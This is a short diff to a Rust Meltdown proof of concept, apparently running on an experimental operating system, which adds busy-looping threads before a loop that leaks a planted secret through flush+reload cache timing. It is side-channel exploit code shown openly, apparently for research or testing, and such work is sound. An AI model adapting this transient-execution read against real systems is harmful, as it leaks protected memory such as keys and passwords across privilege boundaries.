@@ -11,8 +11,8 @@ use alloc::alloc::{alloc, dealloc, handle_alloc_error, Layout};
 use signal::signal_vector::SignalVector;
 use signal::signal_handler::SignalHandler;
 use syscall::syscall;
-use syscall::SystemCall::SignalHandlerRegister;
-use syscall::SystemCall::ThreadSwitch;
+use syscall::SystemCall::{SignalHandlerRegister, ThreadSwitch};
+use concurrent::thread;
 
 use core::arch::asm;
 
@@ -198,6 +198,14 @@ pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
     return threshold;
 }
 
+fn load_thread() {
+	let thread = thread::current().expect("Can't get current thread!");
+	loop {
+		for _ in 0..1000000 {}
+		print!("{}", thread.id());
+	}
+}
+
 #[unsafe(no_mangle)]
 pub fn main() {
     println!("Meltdown start\n");
@@ -213,7 +221,7 @@ pub fn main() {
 	
 	let ptr;
 	let layout;
-	let mut mem: Vec<MemoryPage>;
+	let mem: Vec<MemoryPage>;
 	let page_size = mem::size_of::<MemoryPage>();
 	let total_memory = page_size * ARRAY_SIZE;
 	
@@ -250,6 +258,12 @@ pub fn main() {
 	
 	let mut index: usize = 0;
 	println!("Secret {} at address {:?}", SECRET, SECRET.as_ptr());
+	
+	for i in 0..3 {
+		thread::create(load_thread);
+		println!("Started load_thread {}!", i);
+	}
+	
 	while index < SECRET.len() {
 		let pointer = SECRET[index..index].as_ptr();
 		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
